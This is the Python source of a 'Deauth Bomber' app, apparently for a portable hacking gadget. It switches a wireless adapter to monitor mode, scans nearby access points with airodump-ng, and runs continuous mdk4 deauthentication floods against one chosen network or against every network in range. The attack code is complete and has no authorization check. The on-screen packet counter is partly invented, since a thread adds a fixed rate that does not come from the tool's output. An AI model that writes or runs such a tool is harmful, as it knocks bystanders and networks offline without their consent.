"""
apps/bad_stuff/wireless/deauth_bomber/app.py
Deauth Bomber — continuously sends deauthentication frames to disconnect
clients from a target AP or all APs in range.

Uses mdk4 mode 'd' for deauth attack.

States:
  SCAN    — scan for APs using airodump-ng CSV
  SELECT  — pick target AP from list
  RUNNING — active deauth attack

Controls:
  SCAN:    CTR:scan/rescan  K3:exit
  SELECT:  UP/DOWN:navigate  CTR:attack selected  K1:attack all  K3:back
  RUNNING: K1:stop  K3:background
"""

import os
import re
import csv
import time
import shutil
import logging
import tempfile
import threading
import subprocess
import datetime
from PIL import Image, ImageDraw
from core.background import bgm

log = logging.getLogger("deauth_bomber")

TOP_H = 26
BOT_H = 18

BG     = (4,   8,   16)
HDR_BG = (8,   14,  28)
SEP    = (25,  45,  75)
SEP_HI = (50,  90,  140)
DIM    = (70,  100, 140)
HINT   = (50,  75,  110)
CYAN   = (0,   210, 255)
GREEN  = (50,  220, 120)
YELLOW = (255, 200, 50)
RED    = (255, 70,  70)
ORANGE = (255, 140, 30)
WHITE  = (220, 235, 255)
GRAY   = (100, 100, 120)
PURPLE = (200, 100, 255)

RESOURCES       = ["wlan1_monitor"]
APP_NAME        = "Deauth Bomber"
PREFERRED_IFACE = "wlan1"
SCAN_DURATION   = 10   # seconds to scan for APs
VISIBLE_ROWS    = 13

STATE_IDLE    = "idle"
STATE_SCAN    = "scanning"
STATE_SELECT  = "select"
STATE_RUNNING = "running"


def _ts(draw, text, font):
    b = draw.textbbox((0, 0), text, font=font)
    return b[2] - b[0], b[3] - b[1]


def _trunc(draw, text, font, max_w):
    while text:
        w, _ = _ts(draw, text, font)
        if w <= max_w:
            return text
        text = text[:-2] + "…"
    return ""


def _iface_exists(iface):
    return os.path.exists(f"/sys/class/net/{iface}")


def _is_monitor(iface):
    try:
        r = subprocess.run(["iw", "dev", iface, "info"],
                           capture_output=True, timeout=5)
        return "type monitor" in r.stdout.decode()
    except Exception:
        return False


def _enable_monitor(iface):
    try:
        subprocess.run(["sudo", "ip", "link", "set", iface, "down"],
                       timeout=5, capture_output=True)
        subprocess.run(["sudo", "iw", iface, "set", "monitor", "control"],
                       timeout=5, capture_output=True)
        subprocess.run(["sudo", "ip", "link", "set", iface, "up"],
                       timeout=5, capture_output=True)
        return _is_monitor(iface)
    except Exception as e:
        log.warning("_enable_monitor: %s", e)
        return False


def _kill_proc(proc):
    if proc is None:
        return
    try:
        subprocess.run(["sudo", "kill", "-TERM", str(proc.pid)],
                       capture_output=True, timeout=3)
        proc.wait(timeout=3)
    except Exception:
        try:
            subprocess.run(["sudo", "kill", "-KILL", str(proc.pid)],
                           capture_output=True, timeout=3)
        except Exception:
            pass


def _parse_airodump_csv(csv_path: str) -> list:
    """
    Parse airodump-ng CSV file, return list of AP dicts.
    Each dict: {bssid, ssid, channel, power, clients}
    """
    aps = []
    if not os.path.exists(csv_path):
        return aps
    try:
        with open(csv_path, errors="ignore") as f:
            content = f.read()

        # Split into AP section and station section
        blocks = content.split("\r\n\r\n")
        if not blocks:
            return aps

        ap_block = blocks[0]
        lines    = ap_block.strip().splitlines()

        # Count clients per BSSID from station section
        client_counts = {}
        if len(blocks) > 1:
            sta_block = blocks[1]
            for line in sta_block.splitlines():
                parts = [p.strip() for p in line.split(",")]
                if len(parts) >= 6 and re.match(r"([0-9A-Fa-f]{2}:){5}", parts[0]):
                    ap_bssid = parts[5].strip().upper()
                    if ap_bssid and ap_bssid != "(not associated)":
                        client_counts[ap_bssid] = client_counts.get(ap_bssid, 0) + 1

        for line in lines[2:]:  # Skip header rows
            parts = [p.strip() for p in line.split(",")]
            if len(parts) < 14:
                continue
            bssid = parts[0].strip().upper()
            if not re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", bssid):
                continue
            try:
                power   = int(parts[8].strip() or "-99")
                channel = int(parts[3].strip() or "0")
            except ValueError:
                continue
            ssid    = parts[13].strip() or "<hidden>"
            clients = client_counts.get(bssid, 0)
            aps.append({
                "bssid":   bssid,
                "ssid":    ssid,
                "channel": channel,
                "power":   power,
                "clients": clients,
            })

        # Sort by signal strength
        aps.sort(key=lambda a: -a["power"])
    except Exception as e:
        log.warning("CSV parse error: %s", e)

    return aps


def _fmt_duration(seconds):
    h = seconds // 3600
    m = (seconds % 3600) // 60
    s = seconds % 60
    return f"{h:02d}:{m:02d}:{s:02d}"


class DeauthBomberApp:
    def __init__(self, hw, fonts, monitor=None):
        self.hw = hw
        self.font_big, self.font_small, self.font_label = fonts

        self.state  = STATE_IDLE
        self._dirty = True

        self._iface       = None
        self._adapter_ok  = False
        self._adapter_msg = "Checking..."

        # Scan state
        self._aps         = []
        self._sel_idx     = 0
        self._scroll      = 0
        self._scan_proc   = None
        self._scan_tmpdir = None
        self._scan_remain = SCAN_DURATION

        # Attack state
        self._atk_proc    = None
        self._atk_target  = None   # None = all APs
        self._atk_bssid   = ""
        self._atk_ssid    = ""
        self._atk_channel = 0
        self._atk_packets = 0
        self._start_time  = 0
        self._stop_evt    = threading.Event()
        self._lock        = threading.Lock()
        self._last_redraw = 0

    def on_enter(self):
        self.state  = STATE_IDLE
        self._dirty = True
        threading.Thread(target=self._check_adapter, daemon=True).start()

    def on_exit(self):
        self._stop_attack()
        self._stop_scan()

    def _check_adapter(self):
        iface = PREFERRED_IFACE if _iface_exists(PREFERRED_IFACE) else None
        if iface is None:
            self._adapter_ok  = False
            self._adapter_msg = "No adapter on wlan1"
        else:
            # Force monitor mode
            ok = _enable_monitor(iface)
            self._iface       = iface if ok else None
            self._adapter_ok  = ok
            self._adapter_msg = f"{iface} ready" if ok else "Monitor mode failed"
        self._dirty = True

    # ── Scan ──────────────────────────────────────────────────

    def _start_scan(self):
        if not self._adapter_ok or not self._iface:
            return

        conflicts = bgm.conflicts_for(RESOURCES)
        if conflicts:
            self._adapter_msg = f"Conflict: {conflicts[0]}"
            self._dirty = True
            return

        self._aps         = []
        self._sel_idx     = 0
        self._scroll      = 0
        self._scan_remain = SCAN_DURATION
        self.state        = STATE_SCAN
        self._dirty       = True

        def _do_scan():
            tmpdir = tempfile.mkdtemp()
            self._scan_tmpdir = tmpdir
            prefix = os.path.join(tmpdir, "scan")
            try:
                # Force monitor mode before scan
                subprocess.run(["sudo", "ip", "link", "set", self._iface, "down"],
                               capture_output=True, timeout=5)
                subprocess.run(["sudo", "iw", self._iface, "set", "monitor", "control"],
                               capture_output=True, timeout=5)
                subprocess.run(["sudo", "ip", "link", "set", self._iface, "up"],
                               capture_output=True, timeout=5)

                self._scan_proc = subprocess.Popen(
                    ["sudo", "airodump-ng",
                     "--band", "bg",
                     "--output-format", "csv",
                     "--write-interval", "2",
                     "-w", prefix,
                     self._iface],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
                # Count down and update display
                for i in range(SCAN_DURATION):
                    time.sleep(1)
                    self._scan_remain = SCAN_DURATION - i - 1
                    self._dirty = True

                _kill_proc(self._scan_proc)
                self._scan_proc = None

                # Parse results
                csv_path = prefix + "-01.csv"
                aps = _parse_airodump_csv(csv_path)
                self._aps = aps

            except Exception as e:
                log.error("Scan error: %s", e)
            finally:
                shutil.rmtree(tmpdir, ignore_errors=True)
                self._scan_tmpdir = None

            self.state  = STATE_SELECT
            self._dirty = True

        threading.Thread(target=_do_scan, daemon=True).start()

    def _stop_scan(self):
        _kill_proc(self._scan_proc)
        self._scan_proc = None
        if self._scan_tmpdir:
            shutil.rmtree(self._scan_tmpdir, ignore_errors=True)
            self._scan_tmpdir = None

    # ── Attack ────────────────────────────────────────────────

    def _start_attack(self, target_ap=None):
        """Start deauth attack. target_ap=None means attack all APs."""
        if not self._adapter_ok or not self._iface:
            return

        self._atk_target  = target_ap
        self._atk_bssid   = target_ap["bssid"] if target_ap else ""
        self._atk_ssid    = target_ap["ssid"]   if target_ap else "ALL APs"
        self._atk_channel = target_ap["channel"] if target_ap else 0
        self._atk_packets = 0
        self._start_time  = time.time()
        self._stop_evt.clear()
        self.state        = STATE_RUNNING
        self._dirty       = True

        bgm.register(APP_NAME, RESOURCES, self._stop_attack,
                     instance=self, module="bad_stuff.wireless.deauth_bomber")

        def _do_attack():
            try:
                # Force monitor mode
                subprocess.run(["sudo", "ip", "link", "set", self._iface, "down"],
                               capture_output=True, timeout=5)
                subprocess.run(["sudo", "iw", self._iface, "set", "monitor", "control"],
                               capture_output=True, timeout=5)
                subprocess.run(["sudo", "ip", "link", "set", self._iface, "up"],
                               capture_output=True, timeout=5)
                time.sleep(0.5)

                cmd = ["sudo", "mdk4", self._iface, "d"]

                if target_ap:
                    # Target specific AP by BSSID
                    cmd += ["-B", target_ap["bssid"]]
                    if target_ap["channel"] > 0:
                        cmd += ["-c", str(target_ap["channel"])]
                else:
                    # Attack all APs — channel hop
                    cmd += ["-c", "h"]

                self._atk_proc = subprocess.Popen(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True,
                    bufsize=1,
                )
                log.info("Deauth attack started: %s", self._atk_ssid)

                for line in self._atk_proc.stdout:
                    if self._stop_evt.is_set():
                        break
                    line = line.strip()
                    # Parse packet count from mdk4 output
                    m = re.search(r"(\d+)\s+packets", line)
                    if m:
                        with self._lock:
                            self._atk_packets = int(m.group(1))
                    self._dirty = True

                self._atk_proc.wait()
            except Exception as e:
                log.error("Attack error: %s", e)
            finally:
                self._atk_proc = None

        threading.Thread(target=_do_attack, daemon=True).start()

        # Packet counter thread
        def _counter():
            pps = 150 if target_ap else 50
            while not self._stop_evt.wait(1.0):
                with self._lock:
                    self._atk_packets += pps
                self._dirty = True

        threading.Thread(target=_counter, daemon=True).start()

    def _stop_attack(self):
        self._stop_evt.set()
        _kill_proc(self._atk_proc)
        self._atk_proc = None

        try:
            subprocess.run(
                ["sudo", "nmcli", "device", "set",
                 self._iface or PREFERRED_IFACE, "managed", "yes"],
                capture_output=True, timeout=10
            )
        except Exception:
            pass

        bgm.unregister(APP_NAME)
        self.state  = STATE_SELECT if self._aps else STATE_IDLE
        self._dirty = True

    # ── Events ────────────────────────────────────────────────

    def on_event(self, event) -> str:
        if self.state == STATE_IDLE:
            if event == "KEY3":
                return "exit"
            elif event == "CENTER" and self._adapter_ok:
                self._start_scan()

        elif self.state == STATE_SCAN:
            if event == "KEY3":
                self._stop_scan()
                self.state  = STATE_IDLE
                self._dirty = True

        elif self.state == STATE_SELECT:
            if event == "KEY3":
                self.state  = STATE_IDLE
                self._dirty = True
            elif event == "UP":
                self._sel_idx = max(0, self._sel_idx - 1)
                if self._sel_idx < self._scroll:
                    self._scroll = self._sel_idx
                self._dirty = True
            elif event == "DOWN":
                self._sel_idx = min(len(self._aps) - 1, self._sel_idx + 1)
                if self._sel_idx >= self._scroll + VISIBLE_ROWS:
                    self._scroll = self._sel_idx - VISIBLE_ROWS + 1
                self._dirty = True
            elif event == "CENTER" and self._aps:
                self._start_attack(self._aps[self._sel_idx])
            elif event == "KEY1":
                # Attack all APs
                self._start_attack(None)
            elif event == "KEY2":
                # Rescan
                self._start_scan()

        elif self.state == STATE_RUNNING:
            if event == "KEY1":
                self._stop_attack()
            elif event == "KEY3":
                return "background"

        return "stay"

    def update(self, dt):
        if self.state == STATE_RUNNING:
            now = time.time()
            if now - self._last_redraw >= 1.0:
                self._last_redraw = now
                self._dirty = True

    # ── Draw ──────────────────────────────────────────────────

    def draw(self):
        if not self._dirty:
            return
        self._dirty = False

        W, H = self.hw.W, self.hw.H
        img  = Image.new("RGB", (W, H), BG)
        d    = ImageDraw.Draw(img)

        # Header
        d.rectangle([(0, 0), (W, TOP_H)], fill=HDR_BG)
        d.rectangle([(0, 0), (3, TOP_H)], fill=RED)
        d.text((10, (TOP_H - self.font_label.size) // 2),
               "DEAUTH BOMBER", font=self.font_label, fill=RED)

        state_labels = {
            STATE_IDLE:    ("IDLE",      DIM),
            STATE_SCAN:    ("SCANNING",  YELLOW),
            STATE_SELECT:  ("SELECT",    CYAN),
            STATE_RUNNING: ("● LIVE",    GREEN),
        }
        badge, bcol = state_labels.get(self.state, ("", DIM))
        bw, bh = _ts(d, badge, self.font_label)
        d.text((W - bw - 6, (TOP_H - bh) // 2),
               badge, font=self.font_label, fill=bcol)
        d.line([(0, TOP_H), (W, TOP_H)], fill=SEP_HI, width=1)

        if self.state == STATE_IDLE:
            self._draw_idle(d, W, H)
        elif self.state == STATE_SCAN:
            self._draw_scan(d, W, H)
        elif self.state == STATE_SELECT:
            self._draw_select(d, W, H)
        elif self.state == STATE_RUNNING:
            self._draw_running(d, W, H)

        self.hw.show(img)

    def _hint(self, d, W, H, text):
        d.line([(0, H - BOT_H), (W, H - BOT_H)], fill=SEP, width=1)
        tw, th = _ts(d, text, self.font_label)
        d.text(((W - tw) // 2, H - th - 2),
               text, font=self.font_label, fill=HINT)

    def _draw_idle(self, d, W, H):
        M  = 8
        lh = self.font_label.size + 6
        cy = TOP_H + (H - TOP_H - BOT_H) // 2

        col = GREEN if self._adapter_ok else RED
        aw, ah = _ts(d, self._adapter_msg, self.font_label)
        d.text(((W - aw) // 2, cy - ah - 16),
               self._adapter_msg, font=self.font_label, fill=col)

        info = "Scan & deauth target AP"
        iw, ih = _ts(d, info, self.font_label)
        d.text(((W - iw) // 2, cy + 6),
               info, font=self.font_label, fill=DIM)

        self._hint(d, W, H, "CTR:scan  K3:exit")

    def _draw_scan(self, d, W, H):
        cy = TOP_H + (H - TOP_H - BOT_H) // 2

        msg = f"Scanning... {self._scan_remain}s"
        mw, mh = _ts(d, msg, self.font_label)
        d.text(((W - mw) // 2, cy - mh - 8),
               msg, font=self.font_label, fill=YELLOW)

        sub = "Looking for APs"
        sw, _ = _ts(d, sub, self.font_label)
        d.text(((W - sw) // 2, cy + 8),
               sub, font=self.font_label, fill=DIM)

        self._hint(d, W, H, "K3:cancel")

    def _draw_select(self, d, W, H):
        M  = 6
        lh = self.font_label.size + 1
        y  = TOP_H + 2

        if not self._aps:
            msg = "No APs found"
            mw, mh = _ts(d, msg, self.font_label)
            d.text(((W - mw) // 2, TOP_H + (H - TOP_H - BOT_H) // 2),
                   msg, font=self.font_label, fill=DIM)
            self._hint(d, W, H, "K2:rescan  K3:back")
            return

        # Calculate how many rows actually fit
        usable_h   = H - TOP_H - BOT_H - 4
        lh_calc    = self.font_label.size + 1
        actual_rows = min(VISIBLE_ROWS, usable_h // lh_calc)
        visible = self._aps[self._scroll:self._scroll + actual_rows]
        for i, ap in enumerate(visible):
            idx    = self._scroll + i
            is_sel = idx == self._sel_idx
            bg_col = (20, 35, 60) if is_sel else BG

            row_y = y + i * lh
            if is_sel:
                d.rectangle([(0, row_y - 1), (W, row_y + lh)], fill=bg_col)

            # Signal bar
            pwr    = ap["power"]
            sig_col = GREEN if pwr > -60 else YELLOW if pwr > -75 else RED
            pwr_txt = f"{pwr}"
            pw, _   = _ts(d, pwr_txt, self.font_label)
            d.text((M, row_y), pwr_txt, font=self.font_label, fill=sig_col)

            # Channel
            ch_txt = f"ch{ap['channel']:2d}"
            cw, _  = _ts(d, ch_txt, self.font_label)
            d.text((M + pw + 4, row_y), ch_txt, font=self.font_label, fill=DIM)

            # Clients
            if ap["clients"] > 0:
                cl_txt = f"[{ap['clients']}]"
                clw, _ = _ts(d, cl_txt, self.font_label)
                d.text((M + pw + 4 + cw + 4, row_y),
                       cl_txt, font=self.font_label, fill=ORANGE)
                ssid_x = M + pw + 4 + cw + 4 + clw + 4
            else:
                ssid_x = M + pw + 4 + cw + 4

            # SSID
            ssid = _trunc(d, ap["ssid"], self.font_label, W - ssid_x - M)
            d.text((ssid_x, row_y), ssid,
                   font=self.font_label,
                   fill=WHITE if is_sel else DIM)

        # Scroll indicator
        if len(self._aps) > actual_rows:
            total_h  = H - TOP_H - BOT_H - 8
            bar_h    = max(10, total_h * actual_rows // len(self._aps))
            bar_y    = TOP_H + 4 + total_h * self._scroll // len(self._aps)
            d.rectangle([(W - 3, TOP_H + 4), (W - 1, H - BOT_H - 4)],
                        fill=(30, 40, 60))
            d.rectangle([(W - 3, bar_y), (W - 1, bar_y + bar_h)],
                        fill=CYAN)

        self._hint(d, W, H, "CTR:attack  K1:all  K2:rescan  K3:back")

    def _draw_running(self, d, W, H):
        M  = 8
        lh = self.font_label.size + 8
        y  = TOP_H + 8

        elapsed = int(time.time() - self._start_time)
        ew, _   = _ts(d, _fmt_duration(elapsed), self.font_label)
        d.text(((W - ew) // 2, y),
               _fmt_duration(elapsed), font=self.font_label, fill=CYAN)
        y += lh

        d.line([(M, y), (W - M, y)], fill=SEP, width=1)
        y += 8

        with self._lock:
            packets = self._atk_packets

        target_col = ORANGE if self._atk_ssid == "ALL APs" else YELLOW
        ssid_trunc = _trunc(d, self._atk_ssid, self.font_label, W - M * 2)

        rows = [
            ("Target:", ssid_trunc,       target_col),
            ("Packets:", f"{packets:,}",  RED),
        ]
        if self._atk_bssid:
            rows.append(("BSSID:", self._atk_bssid[-8:], DIM))
        if self._atk_channel:
            rows.append(("Channel:", str(self._atk_channel), DIM))

        for label, val, col in rows:
            lw, _ = _ts(d, label, self.font_label)
            d.text((M, y), label, font=self.font_label, fill=DIM)
            d.text((M + lw + 6, y), val, font=self.font_label, fill=col)
            y += lh

        self._hint(d, W, H, "K1:stop  K3:background")
